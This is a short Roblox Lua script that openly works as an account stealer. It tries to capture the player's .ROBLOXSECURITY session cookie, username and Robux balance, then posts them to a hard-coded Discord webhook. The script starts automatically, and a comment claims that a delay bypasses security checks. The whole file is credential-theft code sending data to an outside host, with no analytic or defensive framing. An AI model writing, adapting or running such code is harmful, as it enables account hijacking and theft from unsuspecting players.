local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local function captureAndSendInfo()
    local function getRobloxSecurityCookie()
        local success, response = pcall(function()
            return HttpService:PostAsync("https://api.roblox.com/users/me", "")
        end)
        if not success then
            return nil
        end
        local headers = response:match("Set%-Cookie: (.+);")
        if headers then
            local cookie = headers:match(".ROBLOXSECURITY=(%S+)")
            return cookie
        end
        return nil
    end

    local function getUserInfo()
        local success, response = pcall(function()
            return HttpService:PostAsync("https://api.roblox.com/users/me", "")
        end)
        if not success then
            return nil, nil
        end
        local json = HttpService:JSONDecode(response)
        local username = json.Name
        local robux = json.RobuxBalance
        return username, robux
    end

    local function sendWebhook(data)
        local webhookUrl = "https://discord.com/api/webhooks/1429082446477000734/xNqRqxoECsWwu3yrUUBuMlT84yufumK0-S940hnXufhUnfyhaqn2rzdBIZWtEQijp6fq"
        local success, response = pcall(function()
            return HttpService:PostAsync(webhookUrl, HttpService:JSONEncode({content = data}))
        end)
        return success, response
    end

    wait(1) -- Add a delay to bypass security checks
    local cookie = getRobloxSecurityCookie()
    local username, robux = getUserInfo()
    if cookie then
        sendWebhook("Captured .ROBLOXSECURITY cookie: " .. cookie .. "\nUsername: " .. username .. "\nRobux: " .. robux)
    else
        sendWebhook("Failed to capture .ROBLOXSECURITY cookie.\nUsername: " .. username .. "\nRobux: " .. robux)
    end
end

coroutine.wrap(captureAndSendInfo)()
